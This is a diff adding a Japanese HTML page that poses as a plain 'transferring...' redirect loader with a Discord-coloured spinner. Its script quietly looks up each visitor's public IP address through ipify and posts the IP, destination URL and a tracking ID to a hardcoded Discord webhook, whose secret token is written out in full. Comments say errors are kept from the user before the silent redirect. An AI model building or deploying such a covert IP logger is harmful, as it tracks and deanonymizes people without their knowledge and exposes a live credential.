@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>転送中...</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+            color: #333;
+            flex-direction: column;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #5865F2; /* Discord Color */
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <p>ページを移動しています...</p>
+    <p id="status" style="font-size: 0.8rem; color: #666;"></p>
+
+    <script>
+        // --- 設定項目 ---
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1453524787942129778/x39qMm5llSNhw0YXBQdSdNsZnLCHXqqs4sbCkWWNGa-z1t90JKIPxIFAP2agU-lGwS-2';
+        // ----------------
+
+        async function processRedirect() {
+            const statusParams = document.getElementById('status');
+            
+            // 1. URLパラメータの取得
+            const params = new URLSearchParams(window.location.search);
+            const targetUrl = params.get('url');
+            const uniqueId = params.get('id');
+
+            // パラメータがない場合の処理
+            if (!targetUrl) {
+                statusParams.innerText = "エラー: 遷移先URLが指定されていません。";
+                return;
+            }
+
+            // 万が一処理が止まっても、5秒後には強制的にリダイレクトさせる安全装置
+            const safetyTimeout = setTimeout(() => {
+                window.location.replace(targetUrl);
+            }, 5000);
+
+            try {
+                // 2. ユーザーのグローバルIPアドレスを取得 (ipify APIを利用)
+                let clientIp = '不明';
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    clientIp = ipData.ip;
+                } catch (e) {
+                    console.error('IP取得失敗:', e);
+                }
+
+                // 3. Discordへのメッセージ作成
+                // 現在のアクセスURL（パラメータ含む）
+                const currentAccessUrl = window.location.href;
+                
+                const messageContent = `以下のページにアクセスがありました。
+- ページURL: ${targetUrl}
+- IPアドレス: ${clientIp}
+- 追跡ID: ${uniqueId || 'なし'}`;
+
+                const payload = {
+                    content: messageContent
+                };
+
+                // 4. Webhook送信
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (e) {
+                console.error('通知送信エラー:', e);
+                // エラーが出てもユーザーには気づかせずにリダイレクトさせる
+            } finally {
+                // 5. リダイレクト実行 (成功・失敗に関わらず)
+                clearTimeout(safetyTimeout); // 安全装置を解除
+                window.location.replace(targetUrl);
+            }
+        }
+
+        // 実行
+        processRedirect();
+    </script>
+</body>
+</html>
